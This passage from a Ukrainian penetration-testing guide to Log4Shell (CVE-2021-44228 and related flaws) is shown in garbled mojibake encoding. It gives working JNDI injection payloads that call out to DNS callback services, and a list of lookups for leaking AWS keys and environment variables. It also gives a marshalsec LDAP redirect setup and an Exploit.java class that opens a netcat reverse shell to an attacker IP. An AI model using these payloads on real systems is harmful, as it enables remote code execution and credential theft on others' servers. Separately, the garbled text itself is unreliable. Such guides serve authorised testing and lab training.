–±—É–¥—å-—è–∫–æ–≥–æ –≤–≤–æ–¥—É** —Ç–∞ –¥–∞–Ω–∏—Ö, —è–∫—ñ –≤–∫–∞–∑–∞–≤ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫.
## –û–≥–ª—è–¥ CVE, –ø–æ–≤'—è–∑–∞–Ω–∏—Ö –∑ Log4Shell

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[–ö—Ä–∏—Ç–∏—á–Ω–∏–π]**

–¶—è —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å - –∫—Ä–∏—Ç–∏—á–Ω–∏–π **–Ω–µ–Ω–∞–¥—ñ–π–Ω–∏–π –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ–π–Ω–∏–π –¥–µ—Ñ–µ–∫—Ç** –≤ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ñ `log4j-core`, —â–æ –≤–ø–ª–∏–≤–∞—î –Ω–∞ –≤–µ—Ä—Å—ñ—ó –≤—ñ–¥ 2.0-beta9 –¥–æ 2.14.1. –í–æ–Ω–∞ –¥–æ–∑–≤–æ–ª—è—î **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –∑–¥–∞–ª–µ–∫—É (RCE)**, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –∑–∞—Ö–æ–ø–ª—é–≤–∞—Ç–∏ —Å–∏—Å—Ç–µ–º–∏. –ü—Ä–æ–±–ª–µ–º—É –ø–æ–≤—ñ–¥–æ–º–∏–≤ –ß–µ–Ω –ß–∂–∞–æ—Ü–∑—é–Ω –∑ –∫–æ–º–∞–Ω–¥–∏ –±–µ–∑–ø–µ–∫–∏ Alibaba Cloud —ñ –≤–æ–Ω–∞ –≤–ø–ª–∏–≤–∞—î –Ω–∞ —Ä—ñ–∑–Ω—ñ —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–∏ Apache. –ü–æ—á–∞—Ç–∫–æ–≤–∏–π –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —É –≤–µ—Ä—Å—ñ—ó 2.15.0 –±—É–ª–æ –Ω–µ–ø–æ–≤–Ω–∏–º. –î–æ—Å—Ç—É–ø–Ω—ñ –ø—Ä–∞–≤–∏–ª–∞ Sigma –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É ([–ü—Ä–∞–≤–∏–ª–æ 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [–ü—Ä–∞–≤–∏–ª–æ 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[–ö—Ä–∏—Ç–∏—á–Ω–∏–π]**

–°–ø–æ—á–∞—Ç–∫—É –æ—Ü—ñ–Ω–µ–Ω–∏–π —è–∫ –Ω–∏–∑—å–∫–∏–π, –∞–ª–µ –ø—ñ–∑–Ω—ñ—à–µ –ø—ñ–¥–Ω—è—Ç–∏–π –¥–æ –∫—Ä–∏—Ç–∏—á–Ω–æ–≥–æ, —Ü–µ–π CVE —î –¥–µ—Ñ–µ–∫—Ç–æ–º **–í—ñ–¥–º–æ–≤–∏ –≤ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—ñ (DoS)**, —â–æ –≤–∏–Ω–∏–∫–∞—î –≤–Ω–∞—Å–ª—ñ–¥–æ–∫ –Ω–µ–ø–æ–≤–Ω–æ–≥–æ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —É –≤–µ—Ä—Å—ñ—ó 2.15.0 –¥–ª—è CVE-2021-44228. –í—ñ–Ω –≤–ø–ª–∏–≤–∞—î –Ω–∞ –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –ø—Ä–æ–≤–æ–¥–∏—Ç–∏ –∞—Ç–∞–∫–∏ DoS –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å—Ç–≤–æ—Ä–µ–Ω–∏—Ö –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—å. –£ [—Ç–≤—ñ—Ç—ñ](https://twitter.com/marcioalm/status/1471740771581652995) –ø–æ–∫–∞–∑–∞–Ω–æ –º–µ—Ç–æ–¥ –æ–±—Ö—ñ–¥—É. –ü—Ä–æ–±–ª–µ–º–∞ –≤–∏—Ä—ñ—à–µ–Ω–∞ —É –≤–µ—Ä—Å—ñ—è—Ö 2.16.0 —Ç–∞ 2.12.2 —à–ª—è—Ö–æ–º –≤–∏–¥–∞–ª–µ–Ω–Ω—è —à–∞–±–ª–æ–Ω—ñ–≤ –ø–æ—à—É–∫—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å —Ç–∞ –≤–∏–º–∫–Ω–µ–Ω–Ω—è JNDI –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[–í–∏—Å–æ–∫–∏–π]**

–í–ø–ª–∏–≤–∞—é—á–∏ –Ω–∞ –≤–µ—Ä—Å—ñ—ó **Log4j 1.x** –≤ –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è—Ö –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º `JMSAppender`, —Ü–µ–π CVE —î –¥–µ—Ñ–µ–∫—Ç–æ–º –Ω–µ–Ω–∞–¥—ñ–π–Ω–æ—ó –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó. –î–ª—è –≥—ñ–ª–∫–∏ 1.x –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–µ, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ —î –∑–∞—Å—Ç–∞—Ä—ñ–ª–æ—é, —ñ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –¥–æ `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[–ü–æ–º—ñ—Ä–Ω–∏–π]**

–¶—è —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–ø–ª–∏–≤–∞—î –Ω–∞ **–ª–æ–≥—É–≤–∞–ª—å–Ω–∏–π —Ñ—Ä–µ–π–º–≤–æ—Ä–∫ Logback**, –Ω–∞—Å—Ç—É–ø–Ω–∏–∫–∞ Log4j 1.x. –†–∞–Ω—ñ—à–µ –≤–≤–∞–∂–∞–ª–æ—Å—è, —â–æ —Ñ—Ä–µ–π–º–≤–æ—Ä–∫ —î –±–µ–∑–ø–µ—á–Ω–∏–º, –∞–ª–µ –±—É–ª–æ –≤–∏—è–≤–ª–µ–Ω–æ —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, —ñ –±—É–ª–∏ –≤–∏–ø—É—â–µ–Ω—ñ –Ω–æ–≤—ñ –≤–µ—Ä—Å—ñ—ó (1.3.0-alpha11 —Ç–∞ 1.2.9), —â–æ–± –≤–∏–ø—Ä–∞–≤–∏—Ç–∏ –ø—Ä–æ–±–ª–µ–º—É.

### **CVE-2021-45105** **\[–í–∏—Å–æ–∫–∏–π]**

Log4j 2.16.0 –º—ñ—Å—Ç–∏—Ç—å –¥–µ—Ñ–µ–∫—Ç DoS, —â–æ —Å–ø–æ–Ω—É–∫–∞—î –¥–æ –≤–∏–ø—É—Å–∫—É `log4j 2.17.0` –¥–ª—è –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è CVE. –î–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–µ—Ç–∞–ª—ñ –Ω–∞–≤–µ–¥–µ–Ω–æ –≤ [–∑–≤—ñ—Ç—ñ](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/) BleepingComputer.

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

–í–ø–ª–∏–≤–∞—é—á–∏ –Ω–∞ –≤–µ—Ä—Å—ñ—é log4j 2.17, —Ü–µ–π CVE –≤–∏–º–∞–≥–∞—î –≤—ñ–¥ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ –∫–æ–Ω—Ç—Ä–æ–ª—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–æ–≥–æ —Ñ–∞–π–ª—É log4j. –¶–µ –≤–∫–ª—é—á–∞—î –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É —á–µ—Ä–µ–∑ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π JDBCAppender. –î–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–µ—Ç–∞–ª—ñ –¥–æ—Å—Ç—É–ø–Ω—ñ –≤ [–ø–æ—Å—Ç—ñ –±–ª–æ–≥—É Checkmarx](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).

## –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è Log4Shell

### –í–∏—è–≤–ª–µ–Ω–Ω—è

–¶—é —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥—É–∂–µ –ª–µ–≥–∫–æ –≤–∏—è–≤–∏—Ç–∏, —è–∫—â–æ –≤–æ–Ω–∞ –Ω–µ –∑–∞—Ö–∏—â–µ–Ω–∞, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏–º–µ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ **–∑–∞–ø–∏—Ç DNS** –Ω–∞ –∞–¥—Ä–µ—Å—É, —è–∫—É –≤–∏ –≤–∫–∞–∑–∞–ª–∏ —É —Å–≤–æ—î–º—É –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ. –¢–æ–º—É –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, –ø–æ–¥—ñ–±–Ω—ñ –¥–æ:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º [huntress](https://log4shell.huntress.com))

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –æ—Ç—Ä–∏–º–∞–Ω–æ –∑–∞–ø–∏—Ç DNS, —Ü–µ –Ω–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –¥–æ–¥–∞—Ç–æ–∫ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏** (–∞–±–æ –Ω–∞–≤—ñ—Ç—å —î —É—Ä–∞–∑–ª–∏–≤–∏–º), –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –π–æ–≥–æ.

{% hint style="info" %}
–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ –¥–ª—è **–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤–µ—Ä—Å—ñ—ó 2.15** –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥–æ–¥–∞—Ç–∏ **–æ–±—Ö—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ localhost**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **–õ–æ–∫–∞–ª—å–Ω–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è**

–®—É–∫–∞–π—Ç–µ **–ª–æ–∫–∞–ª—å–Ω—ñ —É—Ä–∞–∑–ª–∏–≤—ñ –≤–µ—Ä—Å—ñ—ó** –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞**

–î–µ—è–∫—ñ –∑ –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤–∞–Ω–∏—Ö —Ä–∞–Ω—ñ—à–µ –ø–ª–∞—Ç—Ñ–æ—Ä–º –¥–æ–∑–≤–æ–ª—è—Ç—å –≤–∞–º –≤—Å—Ç–∞–≤–∏—Ç–∏ –¥–µ—è–∫—ñ –∑–º—ñ–Ω–Ω—ñ –¥–∞–Ω—ñ, —è–∫—ñ –±—É–¥—É—Ç—å –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω—ñ –ø—Ä–∏ —ó—Ö –∑–∞–ø–∏—Ç—ñ.\
–¶–µ –º–æ–∂–µ –±—É—Ç–∏ –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è 2 —Ä–µ—á–µ–π:

* –î–ª—è **–ø–µ—Ä–µ–≤—ñ—Ä–∫–∏** –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ
* –î–ª—è **–µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó**, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø—Ä–æ—Å–∏—Ç–∏ —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫:\
–∞–±–æ —Ç–∞–∫ `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** —ñ —è–∫—â–æ **–æ—Ç—Ä–∏–º–∞–Ω–æ –∑–∞–ø–∏—Ç DNS –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º –∑–º—ñ–Ω–Ω–æ—ó —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞**, –≤–∏ –∑–Ω–∞—î—Ç–µ, —â–æ –¥–æ–¥–∞—Ç–æ–∫ —î –≤—Ä–∞–∑–ª–∏–≤–∏–º.

–Ü–Ω—à–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è, —è–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–≤–∏—Ç—ñ–∫—Ç–∏**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ RCE

{% hint style="info" %}
–•–æ—Å—Ç–∏, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ –≤–µ—Ä—Å—ñ—è—Ö JDK –≤–∏—â–µ 6u141, 7u131 –∞–±–æ 8u121, –∑–∞—Ö–∏—â–µ–Ω—ñ –≤—ñ–¥ –≤–µ–∫—Ç–æ—Ä–∞ –∞—Ç–∞–∫–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∫–ª–∞—Å—ñ–≤ LDAP. –¶–µ —á–µ—Ä–µ–∑ —Ç–∏–ø–æ–≤–µ –≤–∏–º–∫–Ω–µ–Ω–Ω—è `com.sun.jndi.ldap.object.trustURLCodebase`, —â–æ –∑–∞–ø–æ–±—ñ–≥–∞—î JNDI –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –≤—ñ–¥–¥–∞–ª–µ–Ω—É –∫–æ–¥–æ–≤—É –±–∞–∑—É —á–µ—Ä–µ–∑ LDAP. –û–¥–Ω–∞–∫ –≤–∞–∂–ª–∏–≤–æ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ —Ü—ñ –≤–µ—Ä—Å—ñ—ó **–Ω–µ –∑–∞—Ö–∏—â–µ–Ω—ñ –≤—ñ–¥ –≤–µ–∫—Ç–æ—Ä–∞ –∞—Ç–∞–∫–∏ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó**.

–î–ª—è –∞—Ç–∞–∫—É—é—á–∏—Ö, —è–∫—ñ –º–∞—é—Ç—å –Ω–∞ –º–µ—Ç—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü—ñ –≤–∏—â—ñ –≤–µ—Ä—Å—ñ—ó JDK, –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **–¥–æ–≤—ñ—Ä—á–∏–π –≥–∞–¥–∂–µ—Ç** —É –¥–æ–¥–∞—Ç–∫—É Java. –ß–∞—Å—Ç–æ –¥–ª—è —Ü—å–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ ysoserial –∞–±–æ JNDIExploit. –ù–∞–≤–ø–∞–∫–∏, –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –Ω–∏–∂—á—ñ –≤–µ—Ä—Å—ñ—ó JDK –≤—ñ–¥–Ω–æ—Å–Ω–æ –ø—Ä–æ—Å—Ç—ñ—à–µ, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü—ñ –≤–µ—Ä—Å—ñ—ó –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–º–∞–Ω—ñ–ø—É–ª—å–æ–≤–∞–Ω—ñ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–ª–∞—Å—ñ–≤.

–î–ª—è **–¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó** (_–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –æ–±–º–µ–∂–µ–Ω—å –Ω–∞ –≤–µ–∫—Ç–æ—Ä–∏ RMI —Ç–∞ CORBA_) **–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —Ä–æ–∑–¥—ñ–ª –ø–æ—Å–∏–ª–∞–Ω—å –Ω–∞ JNDI Naming Reference** –∞–±–æ [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec –∑ –≤–ª–∞—Å–Ω–æ—é –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º

–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Ç–µ—Å—Ç—É–≤–∞—Ç–∏ —Ü–µ –Ω–∞ **THM box:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [**marshalsec**](https://github.com/mbechler/marshalsec) (–¥–æ—Å—Ç—É–ø–Ω–∞ –≤–µ—Ä—Å—ñ—è jar [**—Ç—É—Ç**](https://github.com/RandomRobbieBF/marshalsec-jar)). –¶–µ–π –ø—ñ–¥—Ö—ñ–¥ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î —Å–µ—Ä–≤–µ—Ä –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü—ñ—ó LDAP –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –∑'—î–¥–Ω–∞–Ω—å –Ω–∞ –≤—Ç–æ—Ä–∏–Ω–Ω–∏–π HTTP-—Å–µ—Ä–≤–µ—Ä, –¥–µ –±—É–¥–µ —Ä–æ–∑–º—ñ—â–µ–Ω–æ –µ–∫—Å–ø–ª–æ–π—Ç:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
–©–æ–± –∑–º—É—Å–∏—Ç–∏ —Ü—ñ–ª—å –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –∫–æ–¥ –æ–±–µ—Ä–Ω–µ–Ω–æ–≥–æ —à–µ–ª—É, —Å—Ç–≤–æ—Ä—ñ—Ç—å Java-—Ñ–∞–π–ª –∑ –Ω–∞–∑–≤–æ—é `Exploit.java` –∑ —Ç–∞–∫–∏–º –≤–º—ñ—Å—Ç–æ–º:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
–°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ Java-—Ñ–∞–π–ª —É —Ñ–∞–π–ª –∫–ª–∞—Å—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é: `javac Exploit.java -source 8 -target 8`. –î–∞–ª—ñ —ñ–Ω—ñ—Ü—ñ—é–π—Ç–µ **HTTP-—Å–µ—Ä–≤–µ—Ä** –≤ –∫–∞—Ç–∞–ª–æ–∑—ñ, —â–æ –º—ñ—Å—Ç–∏—Ç—å —Ñ–∞–π–ª –∫–ª–∞—Å—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é: `python3 -m http.server`. –ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ **marshalsec LDAP-—Å–µ—Ä–≤–µ—Ä** –ø–æ—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ —Ü–µ–π HTTP-—Å–µ—Ä–≤–µ—Ä.

–ó–∞–ø—É—Å—Ç—ñ—Ç—å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–ª–∞—Å—É –µ–∫—Å–ø–ª–æ–π—Ç—É –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤–æ–º—É –≤–µ–±-—Å–µ—Ä–≤–µ—Ä—ñ, –≤—ñ–¥–ø—Ä–∞–≤–∏–≤—à–∏ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —Å—Ö–æ–∂–µ –Ω–∞:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**–ü—Ä–∏–º—ñ—Ç–∫–∞:** –¶–µ–π –µ–∫—Å–ø–ª–æ–π—Ç “ë—Ä—É–Ω—Ç—É—î—Ç—å—Å—è –Ω–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó Java –¥–ª—è –¥–æ–∑–≤–æ–ª—É –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –∫–æ–¥—É —á–µ—Ä–µ–∑ LDAP. –Ø–∫—â–æ —Ü–µ –Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω–æ, —Ä–æ–∑–≥–ª—è–Ω—å—Ç–µ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–æ–≤—ñ—Ä–µ–Ω–æ–≥–æ –∫–ª–∞—Å—É –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É.

### RCE - **JNDIExploit**

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑ —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏ –∞–≤—Ç–æ—Ä –≤–∏–¥–∞–ª–∏–≤ —Ü–µ–π –ø—Ä–æ–µ–∫—Ç –∑ github –ø—ñ—Å–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è log4shell. –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∫–µ—à–æ–≤–∞–Ω—É –≤–µ—Ä—Å—ñ—é –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2), –∞–ª–µ —è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–≤–∞–∂–∞—Ç–∏ —Ä—ñ—à–µ–Ω–Ω—è –∞–≤—Ç–æ—Ä–∞, —Å–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ—Å—è —ñ–Ω—à–∏–º –º–µ—Ç–æ–¥–æ–º –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –≤–∏—Ö—ñ–¥–Ω–∏–π –∫–æ–¥ –Ω–∞ wayback machine, —Ç–æ–º—É –∞–±–æ –ø—Ä–æ–∞–Ω–∞–ª—ñ–∑—É–π—Ç–µ –≤–∏—Ö—ñ–¥–Ω–∏–π –∫–æ–¥, –∞–±–æ –≤–∏–∫–æ–Ω–∞–π—Ç–µ jar-—Ñ–∞–π–ª, –∑–Ω–∞—é—á–∏, —â–æ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —â–æ —Å–∞–º–µ –≤–∏ –≤–∏–∫–æ–Ω—É—î—Ç–µ.
{% endhint %}

